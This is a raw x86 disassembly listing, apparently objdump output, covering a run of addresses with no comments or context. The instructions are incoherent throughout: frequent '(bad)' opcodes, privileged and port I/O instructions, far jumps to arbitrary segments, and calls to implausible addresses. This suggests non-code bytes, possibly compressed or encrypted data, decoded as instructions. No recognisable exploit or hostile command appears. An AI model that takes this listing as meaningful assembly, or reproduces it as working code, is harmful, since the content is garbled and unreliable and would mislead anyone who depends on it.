  421d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d07:	jle    0x421d7e
  421d09:	adc    eax,0x8bbf0b24
  421d0e:	xor    eax,0x99fab2c1
  421d13:	push   edi
  421d14:	aad    0xe3
  421d16:	in     al,dx
  421d17:	adc    edi,edx
  421d19:	out    0xba,eax
  421d1b:	sbb    cl,BYTE PTR [edx+0x1d]
  421d1e:	and    al,0xf
  421d20:	xlat   BYTE PTR ds:[ebx]
  421d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d22:	ret    0x2eb3
  421d25:	iret   
  421d26:	xchg   edi,eax
  421d27:	jb     0x421d69
  421d29:	rcl    DWORD PTR ds:0x3752f4a4,1
  421d2f:	mov    ds:0x71eb5da5,al
  421d34:	pop    ebx
  421d35:	lahf   
  421d36:	xor    al,0x97
  421d38:	or     edi,DWORD PTR [edi+0x2a]
  421d3b:	sub    ebx,DWORD PTR [esi]
  421d3d:	push   ecx
  421d3e:	inc    esi
  421d3f:	inc    ebx
  421d40:	adc    DWORD PTR [eax],0x9ebeeef
  421d46:	and    eax,0xadf85d7b
  421d4b:	and    eax,0x8950c31a
  421d50:	iret   
  421d51:	test   BYTE PTR [ebx],dh
  421d53:	or     DWORD PTR [edi-0x1a904646],edi
  421d59:	std    
  421d5a:	cmovge ecx,DWORD PTR [edi+esi*4+0x3af1c26a]
  421d62:	call   0x7566cad1
  421d67:	sbb    ch,bh
  421d69:	inc    eax
  421d6a:	add    al,0xa5
  421d6c:	hlt    
  421d6d:	push   0xfffffff1
  421d6f:	push   ss
  421d70:	shl    DWORD PTR [edi-0x20],0x9e
  421d74:	mov    ebx,0xd2114bd7
  421d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d7a:	pusha  
  421d7b:	aad    0xfd
  421d7d:	adc    bl,BYTE PTR [ecx]
  421d7f:	and    DWORD PTR [ecx-0x70],eax
  421d82:	sbb    ch,BYTE PTR [edi+0x3ea96c94]
  421d88:	aam    0x85
  421d8a:	stos   BYTE PTR es:[edi],al
  421d8b:	ins    DWORD PTR es:[edi],dx
  421d8c:	dec    ebx
  421d8d:	inc    edi
  421d8e:	lea    ebp,[ecx-0x630e267e]
  421d94:	mov    eax,ds:0x553c40
  421d99:	jmp    0x421dd0
  421d9b:	arpl   bp,bp
  421d9d:	nop
  421d9e:	inc    esi
  421d9f:	dec    ecx
  421da0:	pop    esi
  421da1:	daa    
  421da2:	pop    es
  421da3:	cmp    BYTE PTR [eax],al
  421da5:	mov    edi,0x195b754b
  421daa:	sbb    bh,0x9e
  421dad:	scas   eax,DWORD PTR es:[edi]
  421dae:	mov    dl,0xab
  421db0:	jmp    0xf3b6:0x7b6be372
  421db7:	loope  0x421d4e
  421db9:	mov    dl,0x26
  421dbb:	mov    dh,BYTE PTR [eax+0x63]
  421dbe:	jb     0x421d72
  421dc0:	in     al,0x39
  421dc2:	mov    al,0x51
  421dc4:	push   esi
  421dc5:	(bad)  
  421dc6:	mov    edi,DWORD PTR [edx]
  421dc8:	icebp  
  421dc9:	jo     0x421daa
  421dcb:	call   0x4cc61ed7
  421dd0:	arpl   WORD PTR [ebx+0xbfb03bc],di
  421dd6:	push   ebx
  421dd7:	ret    
  421dd8:	jae    0x421e14
  421dda:	pop    edx
  421ddb:	(bad)  
  421ddc:	xchg   edi,eax
  421ddd:	and    BYTE PTR [ebp+0x3d6e0e4c],ch
  421de3:	fs cmp eax,esp
  421de6:	mov    esp,DWORD PTR [ebx+edx*8-0x45]
  421dea:	pop    es
  421deb:	das    
  421dec:	adc    DWORD PTR [eax-0x3521392d],esp
  421df2:	and    BYTE PTR [edx+0x6ea6f750],dl
  421df8:	loop   0x421da4
  421dfa:	das    
  421dfb:	in     eax,dx
  421dfc:	cmp    DWORD PTR [ecx+0x70502a71],0xffffff94
  421e03:	cmp    cl,BYTE PTR [eax+0x67]
  421e06:	or     dl,BYTE PTR [ebp+ebx*1+0x45]
  421e0a:	mov    dl,BYTE PTR [eax-0x3]
  421e0d:	(bad)  
  421e0e:	daa    
  421e0f:	jnp    0x421dcf
  421e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e12:	mov    ch,0x1d
  421e14:	xchg   esi,eax
  421e15:	xchg   ebp,eax
  421e16:	cmp    eax,0x65afa3b8
  421e1b:	xor    bl,dh
  421e1d:	cmp    bh,BYTE PTR ds:0xbfe3e7c3
  421e23:	shl    edi,0xfc
  421e26:	(bad)  
  421e27:	sbb    eax,0x5d12b774
  421e2c:	jbe    0x421e4d
  421e2e:	test   BYTE PTR [edx-0xe6b1fa4],dh
  421e34:	mov    eax,0x2acf6fad
  421e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e3a:	clc    
  421e3b:	(bad)  [esi-0x35fdf2cb]
  421e41:	sbb    eax,0x908566b0
  421e46:	mov    ds:0x427d8dc1,eax
  421e4b:	stc    
  421e4c:	rcr    esp,cl
  421e4e:	ret    
  421e4f:	or     al,0x23
  421e51:	sbb    ecx,eax
  421e53:	sbb    DWORD PTR [esi],edi
  421e55:	rcl    BYTE PTR [edi+0xb7dc555],1
  421e5b:	nop
  421e5c:	retf   0x59ca
  421e5f:	sahf   
  421e60:	cwde   
  421e61:	mov    esp,DWORD PTR ds:[esi+0x430a69d6]
  421e68:	mov    dl,0x83
  421e6a:	push   edx
  421e6b:	pop    edx
  421e6c:	ja     0x421ecb
  421e6e:	or     BYTE PTR [edx+0x75],0x74
  421e72:	lods   eax,DWORD PTR ds:[esi]
  421e73:	clc    
  421e74:	clc    
  421e75:	retf   
  421e76:	adc    dh,dl
  421e78:	inc    eax
  421e79:	aas    
  421e7a:	xchg   ebp,eax
  421e7b:	sub    cl,BYTE PTR [ebx-0x22]
  421e7e:	add    eax,0xd1940876
  421e83:	in     eax,dx
  421e84:	int    0xca
  421e86:	loope  0x421e86
  421e88:	inc    edi
  421e89:	xchg   edi,eax
  421e8a:	daa    
  421e8b:	add    DWORD PTR [ecx+0x61c4bda5],edi
  421e91:	test   al,0x26
  421e93:	ss js  0x421f00
  421e96:	lods   al,BYTE PTR ds:[esi]
  421e97:	sub    edx,DWORD PTR [esi+ebp*1+0x40]
  421e9b:	in     eax,0x28
  421e9d:	adc    DWORD PTR [esi+ebp*8],0x6089a27f
  421ea4:	repnz sbb cl,BYTE PTR [edx]
  421ea7:	jb     0x421ef0
  421ea9:	jb     0x421ec4
  421eab:	(bad)  [ecx]
  421ead:	repnz test BYTE PTR [esi],cl
  421eb0:	push   esi
  421eb1:	int3   
  421eb2:	pop    eax
  421eb3:	jmp    0x421e41
  421eb5:	imul   eax,DWORD PTR [edx-0x23ca9946],0xffffff85
  421ebc:	ret    0x19ca
  421ebf:	xor    eax,0x9348c927
  421ec4:	jle    0x421ee4
  421ec6:	mov    esp,0x5f18c94e
  421ecb:	fstp   TBYTE PTR [ecx+0x6a4322b1]
  421ed1:	cli    
  421ed2:	outs   dx,BYTE PTR ds:[esi]
  421ed3:	inc    ebx
  421ed4:	cwde   
  421ed5:	out    0x28,al
  421ed7:	and    al,0x45
  421ed9:	xchg   esp,eax
  421eda:	mov    eax,ds:0x7b0f4e3c
  421edf:	dec    ebx
  421ee0:	push   edx
  421ee1:	xor    al,0xbf
  421ee3:	and    al,0x8c
  421ee5:	and    edx,esi
  421ee7:	dec    esp
  421ee8:	cdq    
  421ee9:	fcmove st,st(0)
  421eeb:	adc    esi,0xdd61e338
  421ef1:	(bad)  
  421ef2:	(bad)  
  421ef3:	sub    eax,0xf9cb4a4e
  421ef8:	lahf   
  421ef9:	loopne 0x421e92
  421efb:	add    ebx,DWORD PTR [ebp+0x67839843]
  421f01:	jge    0x421ef9
  421f03:	loop   0x421f64
  421f05:	jae    0x421ebb
  421f07:	xor    BYTE PTR [esi-0x76a1f90d],bl
  421f0d:	lea    ebp,[eax-0x26]
  421f10:	add    ecx,DWORD PTR ds:0xeeca3844
  421f16:	adc    DWORD PTR [edi+0xd1d7c53],edi
  421f1c:	and    eax,0x1307a3d4
  421f21:	cli    
  421f22:	lods   eax,DWORD PTR ds:[esi]
  421f23:	out    dx,eax
  421f24:	or     DWORD PTR [edi],eax
  421f26:	out    0xd3,al
  421f28:	and    DWORD PTR [eax],eax
  421f2a:	xor    BYTE PTR [ebp+eiz*1+0x716b7178],dh
  421f31:	add    bl,BYTE PTR [edx]
  421f33:	push   esi
  421f34:	repz test al,0xfa
  421f37:	test   al,0x70
  421f39:	fwait
  421f3a:	loope  0x421ef6
  421f3c:	xor    BYTE PTR [esi],ch
  421f3e:	in     eax,dx
  421f3f:	jl     0x421f14
  421f41:	push   cs
  421f42:	cmp    ch,BYTE PTR [edx+0x3b]
  421f45:	inc    ebp
  421f46:	out    0x5a,eax
  421f48:	fisub  DWORD PTR [esi]
  421f4a:	push   ds
  421f4b:	fcomp  DWORD PTR ds:0x4daeef49
  421f51:	pop    edx
  421f52:	fwait
  421f53:	addr16 inc esp
  421f55:	cs push eax
  421f57:	push   edi
  421f58:	dec    ecx
  421f59:	dec    ax
  421f5b:	clc    
  421f5c:	mov    eax,ds:0x3123b8f2
  421f61:	inc    ecx
  421f62:	int3   
  421f63:	cld    
  421f64:	jmp    0x8977:0x789f6aef
  421f6b:	loope  0x421fa2
  421f6d:	cmp    DWORD PTR [ebx+ecx*8+0x3f8d5a54],edi
  421f74:	add    ah,BYTE PTR [edx]
  421f76:	inc    ecx
  421f77:	leave  
  421f78:	jnp    0x421f5e
  421f7a:	jg     0x421f4b
  421f7c:	test   BYTE PTR [ebx],0xf2
  421f7f:	mov    al,BYTE PTR [ecx+0x23f4487c]
  421f85:	mov    cl,0x8a
  421f87:	ss lahf 
  421f89:	mov    al,0x65
  421f8b:	or     BYTE PTR [ebp+0x3538ec60],bh
  421f91:	enter  0xc981,0x52
  421f95:	push   eax
  421f96:	int    0x9d
  421f98:	cmp    ah,BYTE PTR [ebx+0x43383237]
  421f9e:	call   0x73d0:0x4d78ba3d
  421fa5:	repnz adc edx,DWORD PTR [ecx+0x74]
  421fa9:	push   ss
  421faa:	sub    al,0x1a
  421fac:	in     al,0xd3
  421fae:	push   cs
  421faf:	(bad)  
  421fb0:	jb     0x422023
  421fb2:	pop    edx
  421fb3:	jp     0x421fdf
  421fb5:	test   DWORD PTR [eax],edx
  421fb7:	das    
  421fb8:	ss js  0x42201a
  421fbb:	imul   esp,DWORD PTR [ebx],0xd516f9de
  421fc1:	add    DWORD PTR [edi-0x7b],esi
  421fc4:	out    0x6c,eax
  421fc6:	dec    esp
  421fc7:	xchg   esi,ecx
  421fc9:	and    dl,dl
  421fcb:	rcr    bh,0xe7
  421fce:	loope  0x421f98
  421fd0:	lahf   
  421fd1:	retf   
  421fd2:	push   ecx
  421fd3:	pop    edi
  421fd4:	mov    al,0xd0
  421fd6:	lods   al,BYTE PTR ds:[esi]
  421fd7:	mov    DWORD PTR [ebx],eax
  421fd9:	jo     0x42200a
  421fdb:	and    eax,ebx
  421fdd:	cwde   
  421fde:	ror    BYTE PTR [eax-0x63],1
  421fe1:	mov    dh,BYTE PTR [edi+0x7e93b917]
  421fe7:	pop    es
  421fe8:	pushf  
  421fe9:	mov    ebx,0xb365bf59
  421fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fef:	pop    ss
  421ff0:	push   cs
  421ff1:	sbb    al,0xd2
  421ff3:	in     al,dx
  421ff4:	dec    esi
  421ff5:	xor    esi,0x57
  421ff8:	sub    BYTE PTR [bp-0x7941],bl
  421ffd:	ret    
  421ffe:	xchg   ebp,eax
  421fff:	adc    al,bh
  422001:	sub    ah,BYTE PTR [eax]
  422003:	out    0x19,al
  422005:	and    BYTE PTR [esi],0x4a
  422008:	popf   
  422009:	outs   dx,DWORD PTR ds:[esi]
  42200a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42200b:	clc    
  42200c:	dec    edx
  42200d:	push   ds
  42200e:	xchg   ebp,eax
  42200f:	add    DWORD PTR [ebx+ebp*2-0x1b7d263e],esi
  422016:	jl     0x421fef
  422018:	not    BYTE PTR [ebx-0xc]
  42201b:	imul   BYTE PTR [esi]
  42201d:	enter  0xc5a3,0xe8
  422021:	mov    bh,0xe4
  422023:	les    edx,FWORD PTR [edi+0x53d1141d]
  422029:	pop    ecx
  42202a:	out    dx,eax
  42202b:	inc    edi
  42202c:	xor    ah,bl
  42202e:	fcom   st(1)
  422030:	outs   dx,BYTE PTR ds:[esi]
  422031:	and    al,0x7d
  422033:	(bad)  
  422034:	(bad)  
  422035:	push   0xf1fefb39
  42203a:	sub    al,bh
  42203c:	adc    esp,DWORD PTR [eax+0x28]
  42203f:	test   al,0x67
  422041:	sub    eax,0x999b54f0
  422046:	repnz pop eax
  422048:	mov    dh,0x46
  42204a:	inc    ebp
  42204b:	int    0xa7
  42204d:	dec    ebp
  42204e:	sbb    BYTE PTR [ecx-0xb],ch
  422051:	or     bl,ch
  422053:	jp     0x42202a
  422055:	out    0x2,al
  422057:	mov    esi,0x4ee3d854
  42205c:	fcmovnu st,st(0)
  42205e:	cmc    
  42205f:	fdiv   QWORD PTR [ebp-0x2eb87fe2]
  422065:	rep ins DWORD PTR es:[edi],dx
  422067:	fdiv   st,st(5)
  422069:	inc    edi
  42206a:	cs loop 0x422062
  42206d:	dec    eax
  42206e:	in     al,dx
  42206f:	cmp    eax,0x1d4e50e2
  422074:	(bad)  
  422075:	cld    
  422076:	pop    ds
  422077:	stos   DWORD PTR es:[edi],eax
  422078:	or     cl,BYTE PTR [ebp+0x184b9893]
  42207e:	das    
  42207f:	sub    al,0xb9
  422081:	dec    ecx
  422082:	test   BYTE PTR [ebx+0x2ee2cd7],ah
  422088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422089:	cmp    BYTE PTR [edx+edx*4+0x4e],dh
  42208d:	xchg   ch,dh
  42208f:	mov    ah,0x59
  422091:	sti    
  422092:	xor    al,BYTE PTR [ecx+0x4a]
  422095:	mov    eax,0xd9a78f93
  42209a:	push   ebx
  42209b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42209c:	push   eax
  42209d:	retf   
  42209e:	aaa    
  42209f:	xlat   BYTE PTR ds:[ebx]
  4220a0:	mov    ds:0xcda3568a,al
  4220a5:	push   esi
  4220a6:	mov    eax,ds:0xc99dead0
  4220ab:	xor    al,0x19
  4220ad:	jno    0x422117
  4220af:	(bad)  
  4220b0:	mov    dh,BYTE PTR [eax+edx*2-0x16]
  4220b4:	and    eax,0xe5503c93
  4220b9:	dec    eax
  4220ba:	pop    ebp
  4220bb:	pop    es
  4220bc:	jbe    0x42211f
  4220be:	pop    ds
  4220bf:	pop    ebx
  4220c0:	sub    BYTE PTR [ebp-0x31524e7e],al
  4220c6:	sub    eax,0xa
  4220c9:	out    dx,eax
  4220ca:	not    BYTE PTR [edi-0x6f]
  4220cd:	scas   al,BYTE PTR es:[edi]
  4220ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220cf:	jno    0x422106
  4220d1:	cmp    al,0xb8
  4220d3:	adc    al,0x4b
  4220d5:	mov    ebp,0x5ddbe4ce
  4220da:	aaa    
  4220db:	push   esi
  4220dc:	(bad)  
  4220dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220de:	xchg   esi,eax
  4220df:	sub    al,0x58
  4220e1:	dec    esi
  4220e2:	xchg   eax,ecx
  4220e4:	jge    0x4220e6
  4220e6:	mov    eax,0xac27c413
  4220eb:	jno    0x4220ca
  4220ed:	sub    DWORD PTR [edx+0x6fa1872b],0x59
  4220f4:	and    ebp,DWORD PTR [edi-0x28]
  4220f7:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4220f9:	into   
  4220fa:	push   edi
  4220fb:	xlat   BYTE PTR ds:[ebx]
  4220fc:	mov    bl,0xe7
  4220fe:	fsubr  st,st(1)
  422100:	xor    DWORD PTR ss:[ebp+0x31cd1733],eax
  422107:	dec    BYTE PTR [ecx-0x4c45744e]
  42210d:	push   edx
  42210e:	xchg   ebx,eax
  42210f:	mov    bh,0xc6
  422111:	mov    ds:0x8facf6c3,al
  422116:	adc    ebx,ebp
  422118:	adc    eax,0x6b32f88e
  42211d:	stc    
  42211e:	lods   al,BYTE PTR ds:[esi]
  42211f:	enter  0x23d2,0x9f
  422123:	adc    ecx,esp
  422125:	pop    esp
  422126:	push   0x945b746a
  42212b:	sahf   
  42212c:	jne    0x422102
  42212e:	cld    
  42212f:	mov    ecx,0xa553bc5b
  422134:	inc    ecx
  422135:	sti    
  422136:	inc    esp
  422137:	loope  0x4221b0
  422139:	adc    ecx,DWORD PTR [esi-0x121c25e7]
  42213f:	pop    esp
  422140:	sbb    bl,cl
  422142:	push   ebx
  422143:	pop    ss
  422144:	jge    0x4221a2
  422146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422147:	pusha  
  422148:	jnp    0x422175
  42214a:	push   ebx
  42214b:	jne    0x42216a
  42214d:	or     BYTE PTR [eax],0xc3
  422150:	sar    ebx,1
  422152:	in     al,dx
  422153:	jae    0x4220f8
  422155:	sbb    bl,bl
  422157:	lahf   
  422158:	cmp    esi,edi
  42215a:	sub    cl,BYTE PTR [edi]
  42215c:	or     eax,0xcffaa9fb
  422161:	mov    al,0xc9
  422163:	stos   BYTE PTR es:[edi],al
  422164:	jbe    0x42218c
  422166:	jo     0x42216c
  422168:	das    
  422169:	cmp    ch,BYTE PTR [esi]
  42216b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42216c:	pop    es
  42216d:	sbb    DWORD PTR [eax+0x35],ebx
  422170:	pop    ebp
  422171:	push   es
  422172:	xchg   edx,eax
  422173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422174:	jl     0x422147
  422176:	lds    eax,FWORD PTR [esi-0x79]
  422179:	or     al,0x23
  42217b:	fimul  WORD PTR [edx+esi*1]
  42217e:	mov    ch,BYTE PTR [ebx+ebx*2-0x49]
  422182:	in     eax,0x28
  422184:	in     eax,0x5d
  422186:	addr16 dec ebx
  422188:	data16 std 
  42218a:	mov    dl,0x52
  42218c:	push   eax
  42218d:	(bad)  
  42218e:	mov    DWORD PTR [esi],ecx
  422190:	pop    edi
  422191:	rcr    BYTE PTR [edx+0x216bbafd],0xcd
  422198:	cli    
  422199:	fcom   QWORD PTR [ecx-0x6c144de]
  42219f:	cmc    
  4221a0:	ror    DWORD PTR [edi+0xae651a2],cl
  4221a6:	(bad)  
  4221a8:	adc    BYTE PTR [edx+0x124ec629],dl
  4221ae:	add    BYTE PTR [eax+0xbe57f59],ch
  4221b4:	jmp    0x8755:0x735166b
  4221bb:	cmp    ax,0xd0fd
  4221bf:	push   ss
  4221c0:	push   ebp
  4221c1:	fimul  WORD PTR [edi]
  4221c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221c4:	adc    DWORD PTR [ebx+0x1c],edi
  4221c7:	je     0x4221cc
  4221c9:	jg     0x422225
  4221cb:	mov    esi,DWORD PTR [ebp-0x6f8a8658]
  4221d1:	hlt    
  4221d2:	mov    ebp,0x8e898d3b
  4221d7:	aam    0x22
  4221d9:	xor    BYTE PTR [eax+0x3f],al
  4221dc:	adc    BYTE PTR [ecx+0x52b45f92],bl
  4221e2:	jg     0x422246
  4221e4:	aad    0x80
  4221e6:	fwait
  4221e7:	out    0x1f,eax
  4221e9:	clc    
  4221ea:	pop    ebx
  4221eb:	(bad)  
  4221ec:	shl    BYTE PTR [esi-0x832b7d1],cl
  4221f2:	mov    ds:0xad88eff8,eax
  4221f7:	sbb    ch,dh
  4221f9:	pop    edx
  4221fa:	mov    ebx,fs
  4221fc:	ins    BYTE PTR es:[edi],dx
  4221fd:	hlt    
  4221fe:	or     BYTE PTR [ebp-0x301f9fd7],ah
  422204:	sub    ebp,DWORD PTR [edi+0x21]
  422207:	push   es
  422208:	push   ecx
  422209:	call   0x3937472e
  42220e:	inc    ebp
  42220f:	push   ss
  422210:	mov    ah,0xc9
  422212:	add    BYTE PTR [edi-0x59b00baa],ah
  422218:	dec    ecx
  422219:	mov    esi,0x34c0bf8a
  42221e:	push   esi
  42221f:	dec    esi
  422220:	iret   
  422221:	das    
  422222:	sti    
  422223:	push   esp
  422224:	aas    
  422225:	clc    
  422226:	jle    0x422273
  422228:	je     0x422249
  42222a:	sub    edi,DWORD PTR [esi]
  42222c:	cwde   
  42222d:	pop    esp
  42222e:	mov    eax,0xd30698fc
  422233:	mul    BYTE PTR [edi-0x16]
  422236:	mov    eax,es
  422238:	and    eax,0xc62b554c
  42223d:	mov    eax,ds:0x3fcaeac9
  422242:	out    0xd9,al
  422244:	icebp  
  422245:	and    esi,DWORD PTR ds:0x76fecb05
  42224b:	daa    
  42224c:	cmc    
  42224d:	jmp    0xe75b40a5
  422252:	jno    0x42221b
  422254:	iret   
  422255:	cmp    eax,ebp
  422257:	dec    edx
  422258:	xor    esi,DWORD PTR [ebp-0x1e]
  42225b:	push   ecx
  42225c:	sbb    DWORD PTR [edx],ebp
  42225e:	icebp  
  42225f:	pop    esp
  422260:	pop    edi
  422261:	push   ss
  422262:	xchg   edi,eax
  422263:	fisttp WORD PTR [eax]
  422265:	rcl    BYTE PTR [eax+0x1179b6d],cl
  42226b:	cmp    BYTE PTR [ecx],bl
  42226d:	push   0x4
  42226f:	push   esi
  422270:	inc    edx
  422271:	neg    bh
  422273:	outs   dx,DWORD PTR ds:[esi]
  422274:	dec    esp
  422275:	inc    edx
  422276:	inc    esi
  422277:	mov    bh,0xde
  422279:	push   cs
  42227a:	jns    0x42227a
  42227c:	cs mov bh,0x88
  42227f:	and    eax,0xcf415b5f
  422284:	or     ecx,DWORD PTR [ecx-0x27f55a29]
  42228a:	ror    BYTE PTR [ebx+0x6],0x2d
  42228e:	or     dl,dh
  422290:	mov    dh,0x76
  422292:	inc    ecx
  422293:	lahf   
  422294:	pop    edx
  422295:	in     eax,dx
  422296:	call   0xfb54cdfc
  42229b:	xchg   ecx,eax
  42229c:	test   al,0x53
  42229e:	and    esi,edx
  4222a0:	xchg   edx,eax
  4222a1:	nop
  4222a2:	pushf  
  4222a3:	cli    
  4222a4:	mov    edi,0x984e4f3a
  4222a9:	and    al,ah
  4222ab:	test   al,0x75
  4222ad:	aas    
  4222ae:	cmp    esi,edx
  4222b0:	add    edi,DWORD PTR [esi]
  4222b2:	pop    ecx
  4222b3:	fisubr WORD PTR [ecx+esi*2+0x6f1add08]
  4222ba:	xor    DWORD PTR [esi-0x10d599d],edx
  4222c0:	mov    fs:0xa73c8358,eax
  4222c6:	mov    ch,0xe8
  4222c8:	mov    dl,0x1e
  4222ca:	(bad)  
  4222cb:	aad    0x5f
  4222cd:	adc    DWORD PTR [esi],esi
  4222cf:	bnd jbe 0x42232e
  4222d2:	mov    ds:0x1c3063af,al
  4222d7:	mov    eax,ds:0xfe48d473
  4222dc:	mov    edi,0xae1879b7
  4222e1:	cpuid  
  4222e3:	jg     0x4222bd
  4222e5:	jbe    0x4222d4
  4222e7:	push   edx
  4222e8:	xor    BYTE PTR [ecx-0x35a22243],al
  4222ee:	loope  0x42231a
  4222f0:	xchg   ecx,eax
  4222f1:	and    cl,BYTE PTR [ebx+0x28c6af8b]
  4222f7:	cld    
  4222f8:	push   ebp
  4222f9:	hlt    
  4222fa:	sbb    DWORD PTR [ebx+0x1d],0x34
  4222fe:	sbb    eax,ebx
  422300:	dec    ecx
  422301:	out    0x58,al
  422303:	hlt    
  422304:	cmp    DWORD PTR [ecx-0x3ef87e11],ecx
  42230a:	and    edi,DWORD PTR [esi+0x3fe3c6df]
  422310:	push   ds
  422311:	mov    esi,0xa1ab7e2a
  422316:	jle    0x42231b
  422318:	cli    
  422319:	sbb    esp,DWORD PTR [esi+ecx*4+0x7d62c698]
  422320:	loop   0x422306
  422322:	ins    DWORD PTR es:[edi],dx
  422323:	cmp    BYTE PTR [edi-0x68],0x35
  422327:	mov    ds:0x4422432a,eax
  42232c:	mov    WORD PTR [esi-0x621ddd7a],es
  422332:	mov    bh,0x63
  422334:	pushf  
  422335:	jbe    0x4222ff
  422337:	out    0xd8,eax
  422339:	pop    ds
  42233a:	push   esi
  42233b:	adc    BYTE PTR [ebx+edi*1+0x10794b86],bh
  422342:	sub    dl,BYTE PTR [eax+0x4a6a95fd]
  422348:	cs mov ah,0xb
  42234b:	mov    DWORD PTR [edx+0xf],ebx
  42234e:	xor    edx,DWORD PTR [ebx-0x1e]
  422351:	jecxz  0x42239d
  422353:	inc    edx
  422354:	pop    ds
  422355:	pmaxsw mm3,QWORD PTR [eax]
  422358:	mov    al,BYTE PTR [edx-0x41]
  42235b:	fs push ecx
  42235d:	dec    ebp
  42235e:	arpl   WORD PTR [edi+0x72bef940],di
  422364:	cmp    DWORD PTR [esi],0xb4c88032
  42236a:	mov    cs,WORD PTR [ecx]
  42236c:	mov    BYTE PTR [esi+0x0],dl
  42236f:	cld    
  422370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422371:	and    al,0x22
  422373:	test   DWORD PTR ds:0x723fbeb4,ebx
  422379:	in     eax,dx
  42237a:	pop    ss
  42237b:	es dec eax
  42237d:	fs mov es,esp
  422380:	dec    edx
  422381:	sub    al,bh
  422383:	mov    bx,0xac65
  422387:	or     ecx,DWORD PTR [esi]
  422389:	dec    edx
  42238a:	clc    
  42238b:	jmp    0x266e:0x14aa5dc0
  422392:	pop    ds
  422393:	xchg   BYTE PTR [ecx-0x578e6cba],bl
  422399:	hlt    
  42239a:	inc    edx
  42239b:	add    al,BYTE PTR [edx+0x66]
  42239e:	fcom   DWORD PTR [ecx]
  4223a0:	inc    esp
  4223a1:	adc    eax,0x1e
  4223a4:	cld    
  4223a5:	mov    esp,0x678d96da
  4223aa:	stos   DWORD PTR es:[edi],eax
  4223ab:	pop    ds
  4223ac:	outs   dx,BYTE PTR ss:[esi]
  4223ae:	push   cs
  4223af:	sbb    al,0x4c
  4223b1:	cmp    bx,WORD PTR [ecx]
  4223b4:	lock adc BYTE PTR [esi+0x67dbc284],bh
  4223bb:	sar    DWORD PTR [ebp+0x2],0xaf
  4223bf:	inc    ecx
  4223c0:	shl    DWORD PTR [ecx+0x60],1
  4223c3:	daa    
  4223c4:	popf   
  4223c5:	inc    ecx
  4223c6:	sub    eax,0x550c4733
  4223cb:	mov    ds:0x32175faf,eax
  4223d0:	jno    0x4223cb
  4223d2:	int    0xbf
  4223d4:	pop    esi
  4223d5:	pop    ss
  4223d6:	dec    edx
  4223d7:	arpl   WORD PTR [esi],bx
  4223d9:	mov    bl,0xd1
  4223db:	and    cl,BYTE PTR [ebx+0x2]
  4223de:	xchg   ecx,eax
  4223df:	sub    DWORD PTR [ecx-0x689b2228],ebp
  4223e5:	pop    ds
  4223e6:	jns    0x422453
  4223e8:	xchg   dh,dl
  4223ea:	dec    edx
  4223eb:	fldenv [edi]
  4223ed:	je     0x4223d5
  4223ef:	dec    edi
  4223f0:	push   es
  4223f1:	add    cl,BYTE PTR [eax]
  4223f3:	jp     0x422383
  4223f5:	ins    DWORD PTR es:[edi],dx
  4223f6:	popa   
  4223f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223f8:	adc    al,0xb8
  4223fa:	pushf  
  4223fb:	xchg   esi,eax
  4223fc:	add    eax,0x755af673
  422401:	push   cs
  422402:	push   eax
  422403:	std    
  422404:	inc    esp
  422405:	inc    ebx
  422406:	add    BYTE PTR ds:0x9515a0c9,dl
  42240c:	test   BYTE PTR [ebp-0x48],dl
  42240f:	mov    bh,0x1e
  422411:	dec    ecx
  422412:	out    0xd7,eax
  422414:	mov    al,0x6a
  422416:	and    esi,0xffffffbc
  422419:	pusha  
  42241a:	jle    0x4223c9
  42241c:	adc    DWORD PTR [ecx-0x7e],ebx
  42241f:	in     al,0xee
  422421:	xor    eax,ebp
  422423:	fisttp QWORD PTR [eax]
  422425:	xor    ah,BYTE PTR [esi-0x5e58abed]
  42242b:	or     ebp,DWORD PTR [ebp+0x2e]
  42242e:	inc    ebp
  42242f:	lock loope 0x42248b
  422432:	cs dec esp
  422434:	mov    edi,esi
  422436:	retf   
  422437:	scas   eax,DWORD PTR es:[edi]
  422438:	sbb    eax,0xb2dd5b30
  42243d:	sbb    dh,BYTE PTR [ebp+0x4d]
  422440:	inc    esi
  422441:	scas   eax,DWORD PTR es:[edi]
  422442:	shl    DWORD PTR [edx],1
  422444:	push   ss
  422445:	jmp    0x6dec270d
  42244a:	add    eax,0x91bd4b19
  42244f:	mov    cl,0x1f
  422451:	mov    WORD PTR [edi],?
  422453:	push   cs
  422454:	pusha  
  422455:	jle    0x42242d
  422457:	dec    esi
  422458:	mov    ebp,esi
  42245a:	add    esp,edi
  42245c:	jecxz  0x42249f
  42245e:	and    DWORD PTR [eax-0x41af7ac5],edi
  422464:	sbb    ch,dh
  422466:	pushf  
  422467:	inc    eax
  422468:	pusha  
  422469:	add    esi,DWORD PTR [ebx-0x26]
  42246c:	adc    eax,0x5fc7be07
  422471:	aas    
  422472:	pop    edi
  422473:	lds    esi,FWORD PTR [esi]
  422475:	and    DWORD PTR [ebx-0x14],eax
  422478:	pushf  
  422479:	and    al,0x76
  42247b:	ins    BYTE PTR es:[edi],dx
  42247c:	push   cs
  42247d:	lods   al,BYTE PTR ds:[esi]
  42247e:	in     al,dx
  42247f:	dec    eax
  422480:	mov    BYTE PTR [ecx-0x17],bh
  422483:	les    edx,FWORD PTR [ecx]
  422485:	push   0xffffffd8
  422487:	cmp    al,BYTE PTR [edx-0xa55f8c4]
  42248d:	into   
  42248e:	lds    esi,FWORD PTR [ebp+0x2c2be65d]
  422494:	pop    DWORD PTR [eax+0x35]
